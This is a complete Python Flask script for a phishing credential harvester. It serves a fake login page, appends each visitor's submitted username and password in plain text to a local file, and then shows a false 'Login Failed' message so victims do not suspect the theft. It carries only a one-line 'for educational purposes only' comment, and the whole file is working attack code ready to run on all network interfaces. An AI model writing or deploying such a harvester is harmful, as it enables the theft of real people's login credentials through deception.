from flask import Flask, render_template, request
import os

app = Flask(__name__)

# Route for the fake login page
@app.route('/')
def login():
    return render_template('login.html')

# Handle form submission
@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Save credentials to a file (for educational purposes only)
    with open('captured_credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")
    
    return "Login Failed. Please try again."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
